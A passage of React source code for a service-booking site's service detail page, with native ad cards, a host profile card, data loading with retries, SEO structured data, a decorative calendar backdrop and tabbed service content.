    <h3 className="mt-2 text-sm font-bold text-gray-900">Ad space available</h3>
    <p className="mt-1 text-xs leading-relaxed text-gray-500">Reach buyers actively booking services.</p>
    <a href="mailto:bolt@meeticulous.in?subject=Ad%20space%20enquiry"
      className="mt-3 inline-flex items-center gap-1 text-sm font-semibold no-underline hover:underline"
      style={{ color: 'var(--profile-accent, #960D32)' }}>
      Advertise here →
    </a>
  </div>
);

// ─── Sponsored Card — promo upsell styled like a native ad slot ────────────────
const SponsoredCard = () => (
  <div className="relative rounded-2xl border border-gray-200 bg-white p-5 text-center">
    {/* Ad label */}
    <div className="absolute right-3 top-3 flex items-center gap-1.5 text-[11px] text-gray-400">
      <span>Ad</span>
      <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><circle cx="5" cy="12" r="1.6"/><circle cx="12" cy="12" r="1.6"/><circle cx="19" cy="12" r="1.6"/></svg>
    </div>

    {/* Eyebrow stat */}
    <p className="px-4 pt-1 text-xs leading-relaxed text-gray-500">
      Verified hosts get up to <strong className="text-gray-700">5x more bookings</strong> on average
    </p>

    {/* Avatar + Pro badge */}
    <div className="my-4 flex items-center justify-center gap-3">
      <div className="flex h-16 w-16 items-center justify-center overflow-hidden rounded-full bg-gray-100 text-gray-300">
        <svg className="w-9 h-9" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-4.42 0-8 2.69-8 6v2h16v-2c0-3.31-3.58-6-8-6z"/></svg>
      </div>
      <span className="inline-flex items-center gap-1.5 text-sm font-semibold text-gray-700">
        <svg className="w-4 h-4" viewBox="0 0 24 24" fill="#E0A431"><rect x="3" y="3" width="18" height="18" rx="3"/></svg>
        Pro
      </span>
    </div>

    {/* Headline */}
    <p className="text-base font-semibold leading-snug text-gray-700">More visibility means more bookings</p>

    {/* Pill CTA */}
    <Link to="/become-a-host"
      className="btn cta-ghost mt-4 inline-flex items-center justify-center !rounded-full px-6 py-2.5 text-sm font-semibold no-underline">
      Try 1 month free
    </Link>
  </div>
);

// ─── Sponsored Card B — second native ad slot ─────────────────────────────────
const SponsoredCardB = () => (
  <div className="relative rounded-2xl border border-gray-200 bg-white p-5 text-center">
    {/* Ad label */}
    <div className="absolute right-3 top-3 flex items-center gap-1.5 text-[11px] text-gray-400">
      <span>Ad</span>
      <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><circle cx="5" cy="12" r="1.6"/><circle cx="12" cy="12" r="1.6"/><circle cx="19" cy="12" r="1.6"/></svg>
    </div>

    {/* Eyebrow */}
    <p className="px-4 pt-1 text-xs leading-relaxed text-gray-500">
      List your service free for <strong className="text-gray-700">30 days</strong>. Get started today.
    </p>

    {/* Avatar + brand mark */}
    <div className="my-4 flex items-center justify-center gap-4">
      <div className="flex h-16 w-16 items-center justify-center overflow-hidden rounded-full bg-gray-100 text-gray-300">
        <svg className="w-9 h-9" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-4.42 0-8 2.69-8 6v2h16v-2c0-3.31-3.58-6-8-6z"/></svg>
      </div>
      <div className="flex h-11 w-11 items-center justify-center rounded-xl text-base font-black text-white"
        style={{ background: 'var(--profile-accent, #960D32)' }}>B</div>
    </div>

    {/* Headline */}
    <p className="text-base font-semibold leading-snug text-gray-700">Save time and grow your bookings.</p>

    {/* Pill CTA */}
    <Link to="/become-a-host"
      className="btn cta-ghost mt-4 inline-flex items-center justify-center !rounded-full px-6 py-2.5 text-sm font-semibold no-underline">
      Sign Up
    </Link>
  </div>
);

// ─── Display Ad Card — bold full-bleed banner (LinkedIn-style) ─────────────────
const DisplayAdCard = () => (
  <Link to="/become-a-host"
    className="group relative block overflow-hidden rounded-2xl no-underline"
    style={{ background: '#1463D6' }}>
    {/* Ad tag */}
    <span className="absolute right-3 top-2 z-10 text-[11px] font-medium text-white/70">Ad</span>

    <div className="space-y-2.5 p-5">
      {/* navy bubble */}
      <div className="inline-block rounded-2xl bg-[#0A2A66] px-4 py-3">
        <p className="text-2xl font-black leading-[1.05] tracking-tight text-white">Bookings<br/>slipping away?</p>
      </div>
      {/* yellow bubble, overlapping */}
      <div className="-mt-1 rounded-2xl bg-[#FFC400] px-4 py-3.5">
        <p className="text-2xl font-black leading-[1.05] tracking-tight text-[#0A2A66]">But a Sloth can run your calendar for you.</p>
      </div>

      {/* bottom row — pill CTA + wordmark */}
      <div className="flex items-center justify-between gap-2 pt-2">
        <span className="inline-flex items-center gap-2 rounded-full bg-[#0A2A66] py-2 pl-4 pr-1.5 text-sm font-bold text-white transition-transform group-">
          Get started
          <span className="flex h-7 w-7 items-center justify-center rounded-full" style={{ background: '#FFC400' }}>
            <svg className="w-4 h-4 text-[#0A2A66]" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
          </span>
        </span>
        <span className="text-sm font-extrabold leading-tight text-white text-right">Book A<br/>Sloth Pro</span>
      </div>
    </div>
  </Link>
);

// ─── Profile Card (creator summary — sits below the booking card) ─────────────
// Premium, vertical layout distinct from the HostTab. Excludes bio.
const ProfileCard = ({ vendor, rating, reviewCount, bookings }) => {
  const [btnHover, setBtnHover] = useState(false);
  if (!vendor?.name) return null;

  const expertise = [vendor.profession, vendor.tagline]
    .filter(Boolean)
    .filter((v, i, a) => a.indexOf(v) === i);

  const accent = 'var(--profile-accent, #960D32)';

  return (
    <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
      <div className="px-5 pb-5 pt-5 text-center">
        {/* Photo — centered */}
        <div className="flex justify-center mb-3">
          <div className="w-20 h-20 rounded-2xl border-[3px] border-white shadow-sm overflow-hidden bg-white">
            {vendor.profile_image
              ? <img src={vendor.profile_image} alt={vendor.name} className="w-full h-full object-cover"/>
              : <div className="w-full h-full flex items-center justify-center text-2xl font-bold"
                  style={{ background: `color-mix(in srgb, ${accent} 12%, white)`, color: accent }}>
                  {vendor.name.charAt(0).toUpperCase()}
                </div>}
          </div>
        </div>

        {/* Name + verified — centered */}
        <div className="flex items-center justify-center gap-1.5">
          <h3 className="text-base font-bold text-gray-900">{vendor.name}</h3>
          {vendor.is_verified && (
            <svg className="w-4 h-4 flex-shrink-0 text-green-500" fill="currentColor" viewBox="0 0 24 24">
              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
            </svg>
          )}
        </div>

        {/* Profession — plain text, no badge */}
        {expertise.length > 0 && (
          <p className="text-sm text-gray-500 mt-1">{expertise.join(' · ')}</p>
        )}

        {/* Inline stats: rating · bookings */}
        {(rating > 0 || bookings > 0) && (
          <div className="flex items-center justify-center flex-wrap gap-x-4 gap-y-1 mt-3 text-sm">
            {rating > 0 && (
              <span className="flex items-center gap-1 text-gray-700">
                <svg className="w-4 h-4 text-amber-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                <strong className="font-semibold text-gray-900">{rating.toFixed(1)}</strong>
                <span className="text-gray-400">({reviewCount})</span>
              </span>
            )}
            {bookings > 0 && (
              <span className="flex items-center gap-1 text-gray-700">
                <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                <strong className="font-semibold text-gray-900">{bookings}</strong>
                <span className="text-gray-400">booked</span>
              </span>
            )}
          </div>
        )}

        {/* View full profile — white→brand on hover, no underline */}
        {vendor.username && (
          <Link to={`/${vendor.username}`}
            onMouseEnter={() => setBtnHover(true)} onMouseLeave={() => setBtnHover(false)}
            className="btn btn--outline mt-5 w-full inline-flex items-center justify-center gap-1.5 py-2.5 text-sm font-semibold no-underline transition-colors"
            style={{
              background: btnHover ? accent : '#ffffff',
              color: btnHover ? '#ffffff' : accent,
            }}>
            View full profile
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7"/></svg>
          </Link>
        )}
      </div>
    </div>
  );
};

// ─── Main Component ───────────────────────────────────────────────────────────

const TABS = ['Overview', 'Deliverables', 'Host', 'FAQ', 'How it Works', 'Reviews'];

export default function ServiceDetail() {
  const { profileSlug, serviceSlug } = useParams();
  const navigate  = useNavigate();
  // Build-time copy baked into the prerendered HTML → real content on the first
  // frame; the fetch below refreshes it (slots are never baked — always live).
  const seedPath = `/services/public/${profileSlug}/${serviceSlug}`;
  const [data, setData]     = useState(() => prerendered(seedPath) || null);
  const [loading, setLoading] = useState(() => !prerendered(seedPath));
  const [error, setError]   = useState('');
  // Not-found state gets the stripped minimal footer, header kept.
  useMinimalFooter(!loading && (!!error || !data));
  const [tab, setTab]       = useState('Overview');
  const [feeInfoOpen, setFeeInfoOpen] = useState(false); // mobile fee disclaimer
  const [notesModalOpen, setNotesModalOpen] = useState(false);

  // Desktop sidebar polish: collapse the booking-card thumbnail once the reader
  // scrolls past the hero (IntersectionObserver — no scroll handler), and honour
  // reduced-motion by skipping the collapse transition.
  const heroEndRef = useRef(null);
  const [heroInView, setHeroInView] = useState(true);
  const [motionOK, setMotionOK] = useState(true);

  useEffect(() => {
    if (!data) return;
    const onScroll = () => {
      const scrollPct = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight);
      setHeroInView(scrollPct < 0.05);
    };
    onScroll();
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, [data]);

  useEffect(() => {
    if (typeof window === 'undefined' || !window.matchMedia) return;
    const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
    const update = () => setMotionOK(!mq.matches);
    update();
    mq.addEventListener?.('change', update);
    return () => mq.removeEventListener?.('change', update);
  }, []);

  useEffect(() => {
    let alive = true;
    setError('');
    const applyTheme = (v) => applyProfileTheme(
      document.documentElement,
      isValidHex(v?.theme_color) ? v.theme_color : DEFAULT_THEME_COLOR,
    );
    const baked = prerendered(`/services/public/${profileSlug}/${serviceSlug}`);
    if (baked) { setData(baked); setLoading(false); applyTheme(baked.vendor); } else setLoading(true);
    // Only a real 404 means the service is gone → the noindex ErrorPage is correct.
    // Any OTHER failure (network/timeout, 5xx, or a 429/403 from an edge rate-limit
    // or IP guard) is transient: retry with a short backoff, then fall to the
    // non-noindex 'transient' state so a JS-rendering crawler that hit a transient
    // API failure doesn't noindex this live, prerendered page. See TransientError.
    const load = (attempt = 0) => {
      svcGetPublicByProfile(profileSlug, serviceSlug)
        .then(r => {
          if (!alive) return;
          setData(r.data);
          // Per-host theme → CSS vars consumed by the Book Slot CTAs
          const v = r.data?.vendor;
          applyProfileTheme(
            document.documentElement,
            isValidHex(v?.theme_color) ? v.theme_color : DEFAULT_THEME_COLOR,
          );
          // SEO (title/description/robots/canonical/OG/JSON-LD) is rendered
          // declaratively via <Seo> below, from the admin-managed fields.
          setLoading(false);
        })
        .catch((err) => {
          if (!alive) return;
          if (isNotFoundError(err)) { setError('notfound'); setLoading(false); return; }
          if (attempt < 2) { setTimeout(() => { if (alive) load(attempt + 1); }, 800 * (attempt + 1)); return; }
          if (!baked) setError('transient'); // baked copy stays on a transient failure
          setLoading(false);
        });
    };
    load();
    return () => { alive = false; };
  }, [profileSlug, serviceSlug]);

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="text-center text-gray-400">
        <div className="mb-2 flex justify-center"><PetalSpinner size={40} /></div>
        Loading…
      </div>
    </div>
  );

  // A transient failure must NOT noindex a live, prerendered service page — use the
  // non-noindex fallback. A genuinely gone service (404, or an empty payload) still
  // renders the branded noindex ErrorPage, avoiding the thin-200 "soft 404".
  if (error === 'transient') return <TransientError message="This service didn’t load. Please try again." />;
  if (error === 'notfound' || !data) return <ErrorPage code={404} />;

  const { service, vendor, totalServices, totalBookings, reviews, avgRating, ratingBreakdown, bookingFee, bookingFeeBreakdown } = data;

  const handleBookNow = () => {
    // Navigate to /:profileSlug/booking/:serviceSlug
    const pSlug = vendor?.username || profileSlug;
    if (pSlug && service?.slug) {
      navigate(`/${pSlug}/booking/${service.slug}`);
    }
  };

  // Host-authored FAQ wins; otherwise a data-derived templated FAQ so the page (and
  // its FAQPage schema) always carries real, extractable Q&A. Same rule server-side
  // (prerenderController + pageContentModel) so bot HTML matches what guests see.
  const faqs = (Array.isArray(service.faqs) && service.faqs.length)
    ? service.faqs
    : serviceFaqs({ service, vendor });
  const hasFAQs = faqs.length > 0;
  const hasDeliverables = (service.included_items?.length || 0) + (service.excluded_items?.length || 0) > 0;

  // Hero trust signals (derived from existing data — no schema change)
  const rating      = avgRating || service.rating || 0;
  const reviewCount = reviews?.length || service.total_reviews || 0;
  const bookings    = service.total_bookings || 0;
  // Bestseller heuristic: proven volume + high rating
  const isBestseller = bookings >= 10 && rating >= 4.5;
  // Hero eyebrow — "Category · 1:1 Session"
  const eyebrow = [service.category_label, TYPE_LABEL[service.type]].filter(Boolean).join(' · ');

  // Admin-managed SEO → head tags + Service JSON-LD (canonical derived from URL).
  const seo = resolveServiceSeo({ service, vendor, siteUrl: SEO_SITE });
  const jsonLd = [
    serviceJsonLd({ service, vendor, siteUrl: SEO_SITE, avgRating: rating, reviewCount }),
    breadcrumbJsonLd({ items: [
      { name: 'Home', path: '/' },
      { name: vendor.name || vendor.username, path: `/${vendor.username}` },
      { name: service.title, path: `/${vendor.username}/${service.slug}` },
    ], siteUrl: SEO_SITE }),
    ...(faqs.length
      ? [faqJsonLd({ faqs: faqs.map(f => ({ q: f.question, a: f.answer })) })]
      : []),
  ];

  return (
    <div className="min-h-screen bg-canvas relative">
      <Seo {...seo} jsonLd={jsonLd} />
      {/* ── Above-the-fold backdrop — flat dark-grey hero band + calendar-inspired
           accents. Host theme colour no longer paints the hero; it stays on
           CTAs/badges/tabs only. White dots read against the dark band. ── */}
      <div aria-hidden data-bg-band
        className="pointer-events-none absolute inset-x-0 top-0 h-[34rem] sm:h-[30rem] overflow-hidden z-[1]"
        style={{ background: '#2a2a2a' }}>

        {/* ── Dense dot grid — uniform repeating pattern via SVG <pattern> ── */}
        <svg className="absolute inset-0 h-full w-full opacity-[0.22] sm:opacity-[0.26]"
          style={{ color: '#ffffff' }}>
          <defs>
            <pattern id="dot-grid" x="0" y="0" width="24" height="24" patternUnits="userSpaceOnUse">
              <circle cx="12" cy="12" r="1.2" fill="currentColor"/>
            </pattern>
            <linearGradient id="dot-fade" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor="white" stopOpacity="1"/>
              <stop offset="60%" stopColor="white" stopOpacity="0.6"/>
              <stop offset="100%" stopColor="white" stopOpacity="0"/>
            </linearGradient>
            <linearGradient id="dot-fade-lr" x1="0" y1="0" x2="1" y2="0">
              <stop offset="0%" stopColor="white" stopOpacity="0"/>
              <stop offset="30%" stopColor="white" stopOpacity="0.3"/>
              <stop offset="60%" stopColor="white" stopOpacity="0.8"/>
              <stop offset="100%" stopColor="white" stopOpacity="1"/>
            </linearGradient>
            <mask id="dot-mask">
              <rect width="100%" height="100%" fill="url(#dot-fade)"/>
            </mask>
            <mask id="dot-mask-lr">
              <rect width="100%" height="100%" fill="url(#dot-fade-lr)"/>
            </mask>
          </defs>
          <g mask="url(#dot-mask)">
            <g mask="url(#dot-mask-lr)">
              <rect width="100%" height="100%" fill="url(#dot-grid)"/>
            </g>
          </g>
        </svg>

        {/* ── Calendar date grid — 7-col layout with date numbers, right-biased ── */}
        <svg className="absolute top-6 right-0 hidden h-[26rem] w-[42rem] opacity-[0.30] sm:block lg:w-[52rem]"
          viewBox="0 0 700 400" fill="none" style={{ color: '#ffffff' }}>
          {/* row 1: dates 01-07 */}
          <text x="240" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.6">01</text>
          <text x="310" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.7">02</text>
          <text x="380" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.65">03</text>
          <text x="450" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.5">04</text>
          <text x="520" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.7">05</text>
          <text x="590" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.6">06</text>
          <text x="660" y="58" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.4">07</text>
          {/* row 2: dates 08-13 */}
          <text x="280" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.55">08</text>
          <text x="350" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.7">09</text>
          <text x="420" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.6">10</text>
          <text x="490" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.75">11</text>
          <text x="560" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.8">12</text>
          <text x="630" y="128" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.65">13</text>
          {/* row 3: dates 14-20 */}
          <text x="210" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.4">14</text>
          <text x="280" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.55">15</text>
          <text x="350" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.6">16</text>
          <text x="420" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.65">17</text>
          <text x="490" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.7">18</text>
          <text x="560" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.75">19</text>
          <text x="630" y="198" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.5">20</text>
          {/* row 4: dates 21-26 */}
          <text x="240" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.45">21</text>
          <text x="310" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.5">22</text>
          <text x="380" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.55">23</text>
          <text x="450" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.6">24</text>
          <text x="520" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.65">25</text>
          <text x="590" y="268" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.55">26</text>
          {/* row 5: dates 28-31 */}
          <text x="280" y="338" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.35">28</text>
          <text x="350" y="338" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.4">29</text>
          <text x="420" y="338" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.45">30</text>
          <text x="490" y="338" fill="currentColor" fontSize="13" fontFamily="monospace" opacity="0.4">31</text>

          {/* ── Booking connection lines between dates ── */}
          {/* flow 01→02→03 */}
          <path d="M256 52 H300" stroke="currentColor" strokeWidth="0.8" opacity="0.45" strokeDasharray="4 3"/>
          <path d="M326 52 H370" stroke="currentColor" strokeWidth="0.8" opacity="0.4" strokeDasharray="4 3"/>
          {/* flow 05→12 vertical */}
          <path d="M530 64 V118" stroke="currentColor" strokeWidth="0.8" opacity="0.5"/>
          <circle cx="530" cy="64" r="2.5" fill="currentColor" opacity="0.6"/>
          <circle cx="530" cy="118" r="2.5" fill="currentColor" opacity="0.55"/>
          {/* flow 09→10→17 L-shape */}
          <path d="M366 122 H410 V188" stroke="currentColor" strokeWidth="0.8" opacity="0.45"/>
          <circle cx="366" cy="122" r="2" fill="currentColor" opacity="0.5"/>
          <circle cx="410" cy="122" r="2" fill="currentColor" opacity="0.35"/>
          <circle cx="410" cy="188" r="2.5" fill="currentColor" opacity="0.5"/>
          {/* flow 12→13→20 */}
          <path d="M576 122 H620 V188" stroke="currentColor" strokeWidth="0.8" opacity="0.5"/>
          <rect x="618" y="184" width="5" height="5" rx="1" fill="currentColor" opacity="0.6"/>
          {/* flow 18→25 */}
          <path d="M500 204 V258" stroke="currentColor" strokeWidth="0.7" opacity="0.4"/>
          {/* flow 19→26 diagonal-ish connector */}
          <path d="M576 204 V220 H600 V258" stroke="currentColor" strokeWidth="0.7" opacity="0.35"/>
          {/* flow 24→31 */}
          <path d="M460 274 V328" stroke="currentColor" strokeWidth="0.6" opacity="0.3"/>

          {/* ── Calendar cells — small rounded rects around some dates ── */}
          <rect x="516" y="40" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.8" opacity="0.4"/>
          <rect x="556" y="110" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.9" opacity="0.55"/>
          <rect x="486" y="180" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.7" opacity="0.35"/>
          <rect x="626" y="180" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.8" opacity="0.45"/>
          <rect x="516" y="250" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.7" opacity="0.35"/>
          <rect x="346" y="320" width="30" height="28" rx="4" stroke="currentColor" strokeWidth="0.6" opacity="0.25"/>
          {/* scattered cells — no dates, ghost cells */}
          <rect x="170" y="90" width="26" height="22" rx="3" stroke="currentColor" strokeWidth="0.6" opacity="0.2"/>
          <rect x="200" y="230" width="24" height="20" rx="3" stroke="currentColor" strokeWidth="0.5" opacity="0.15"/>
          <rect x="660" y="280" width="28" height="24" rx="4" stroke="currentColor" strokeWidth="0.6" opacity="0.2"/>

          {/* ── Intersection nodes — small glowing squares ── */}
          <rect x="348" y="120" width="4" height="4" rx="1" fill="currentColor" opacity="0.55"/>
          <rect x="488" y="120" width="5" height="5" rx="1" fill="currentColor" opacity="0.65"/>
          <rect x="558" y="50" width="4" height="4" rx="1" fill="currentColor" opacity="0.5"/>
          <rect x="418" y="260" width="4" height="4" rx="1" fill="currentColor" opacity="0.4"/>
          <rect x="528" y="190" width="5" height="5" rx="1" fill="currentColor" opacity="0.5"/>
        </svg>

        {/* ── Left side — very faint scattered dots + one ghost cell (kept ~70% cleaner) ── */}
        <svg className="absolute top-12 left-0 hidden h-48 w-40 opacity-[0.12] sm:block"
          viewBox="0 0 160 200" fill="none" style={{ color: '#ffffff' }}>
          <circle cx="30" cy="30" r="1.5" fill="currentColor" opacity="0.4"/>
          <circle cx="80" cy="50" r="1.2" fill="currentColor" opacity="0.3"/>
          <circle cx="50" cy="90" r="1" fill="currentColor" opacity="0.2"/>
          <circle cx="110" cy="70" r="1.3" fill="currentColor" opacity="0.25"/>
          <circle cx="40" cy="140" r="1" fill="currentColor" opacity="0.15"/>
          <circle cx="90" cy="120" r="1.2" fill="currentColor" opacity="0.2"/>
          <rect x="60" y="150" width="22" height="18" rx="3" stroke="currentColor" strokeWidth="0.5" opacity="0.15"/>
        </svg>
      </div>

      {/* ── HERO + Content — single container so sidebar starts under h1 ── */}
      <div className="app-container pb-28 lg:pb-8 relative z-10" style={{ paddingTop: 44 }}>
        {/* Breadcrumb */}
        <nav className="mb-4 text-xs text-white/50 font-medium" aria-label="Breadcrumb">
          <Link to="/" className="hover:text-white transition-colors">home</Link>
          <span className="mx-1">/</span>
          {vendor?.username && (
            <>
              <Link to={`/${vendor.username}`} className="hover:text-white transition-colors">{vendor.username}</Link>
              <span className="mx-1">/</span>
            </>
          )}
          <span className="text-white/70 max-w-[120px] sm:max-w-[200px] truncate inline-block align-bottom">{service.slug || 'service'}</span>
        </nav>

        <div className="flex flex-col lg:flex-row gap-8">
          {/* ── LEFT: Hero + tabs ── */}
          <div className="flex-1 min-w-0">
            <section className="relative pb-6">

              {/* Eyebrow */}
              {eyebrow && (
                <p className="mb-3 text-xs font-semibold uppercase tracking-[0.12em] text-white/60">{eyebrow}</p>
              )}

              {/* Title — 110% of content column width */}
              <h1 className="text-4xl sm:text-5xl font-black text-white mb-4 leading-[1.1] tracking-tight" style={{ maxWidth: '110%' }}>
                {service.title}
              </h1>

              {/* Short description — 90% width */}
              {service.short_description && (
                <p className="text-base sm:text-lg text-white/80 mb-6 leading-relaxed" style={{ maxWidth: '90%' }}>{service.short_description}</p>
              )}

              {/* Meta — clock | meet/in-person | hosted by — single horizontal line + Important Notes pill */}
              <div className="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-white/90">
                <span className="flex items-center gap-1.5">
                  <svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
                  {fmtDuration(service.duration)}
                </span>
                <span className="text-white/30">|</span>
                <span className="flex items-center gap-1.5">
                  {service.meeting_mode === 'offline'
                    ? <><svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a2 2 0 01-2.828 0l-4.243-4.243a8 8 0 1111.314 0z"/><circle cx="12" cy="11" r="2.5"/></svg>In-person</>
                    : <><svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>Google Meet</>}
                </span>
                {vendor?.name && (
                  <>
                    <span className="text-white/30">|</span>
                    <span className="flex items-center gap-1.5">
                      <span>Hosted by</span>
                      {vendor.profile_image && (
                        <img src={vendor.profile_image} alt="" className="w-[23px] h-[23px] rounded-full object-cover ring-1 ring-primary" />
                      )}
                      <Link to={`/${vendor.username}`} className="font-semibold hover:text-primary transition-colors underline decoration-white/40 hover:decoration-current underline-offset-2">
                        {vendor.name}
                      </Link>
                    </span>
                  </>
                )}
                {service.important_note && (
                  <>
                    <span className="text-white/30">|</span>
                    <button type="button" onClick={() => setNotesModalOpen(true)}
                      className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full border border-amber-300 bg-amber-50 text-amber-800 text-xs font-semibold hover:bg-amber-100 transition-colors">
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                      Important Notes
                    </button>
                  </>
                )}
              </div>
              {/* Sentinel — when this scrolls out of view, sidebar thumbnail collapses */}
              <div ref={heroEndRef} className="h-px" aria-hidden />
            </section>

            {/* Tabs */}
            <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
              {/* Tab bar — desktop only; mobile stacks every section */}
              <div className="hidden lg:flex overflow-x-auto border-b border-gray-100 scrollbar-hide">
                {TABS.map(t => (
                  <button key={t} onClick={() => setTab(t)}
                    className={`px-5 py-3.5 text-sm font-medium whitespace-nowrap flex-shrink-0 transition-colors border-b-2 ${tab === t ? 'border-primary text-primary' : 'border-transparent text-gray-500 hover:text-gray-800'}`}>
                    {t}
                    {t === 'Reviews' && (reviews?.length || 0) > 0 && (
                      <span className="ml-1.5 text-xs bg-amber-100 text-amber-700 px-1.5 py-0.5 rounded-full">{reviews.length}</span>
                    )}
                    {t === 'FAQ' && hasFAQs && (
                      <span className="ml-1.5 text-xs bg-gray-100 text-gray-600 px-1.5 py-0.5 rounded-full">{faqs.length}</span>
                    )}
                  </button>
                ))}
              </div>

              {/* Tab content — desktop: active tab only */}
              <div className="hidden lg:block p-6">
                {tab === 'Overview'     && <OverviewTab html={service.long_description || service.description}/>}
                {tab === 'Deliverables' && <DeliverablesTab included={service.included_items} excluded={service.excluded_items}/>}
                {tab === 'Host'         && (
                  <>
                    <HostTab vendor={vendor} totalServices={totalServices} totalBookings={totalBookings}/>
                    <AvailableSlotsPreview hostId={vendor?.id} serviceId={service.id} onViewAll={handleBookNow}/>
                  </>
                )}
                {tab === 'FAQ'          && <FAQTab faqs={faqs}/>}
                {tab === 'How it Works' && <HowItWorksTab duration={service.duration} online={service.meeting_mode !== 'offline'}/>}
                {tab === 'Reviews'      && <ReviewsTab reviews={reviews} avgRating={avgRating} ratingBreakdown={ratingBreakdown}/>}
              </div>

              {/* Mobile: every section stacked, one after another */}
              <div className="lg:hidden divide-y divide-gray-100">
                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">Overview about {service.title}</h2>
                  <OverviewTab html={service.long_description || service.description}/>
                </section>
                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">Deliverables</h2>
                  <DeliverablesTab included={service.included_items} excluded={service.excluded_items}/>
                </section>
                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">Host</h2>
                  <HostTab vendor={vendor} totalServices={totalServices} totalBookings={totalBookings}/>
                  <AvailableSlotsPreview hostId={vendor?.id} serviceId={service.id} onViewAll={handleBookNow}/>
                </section>
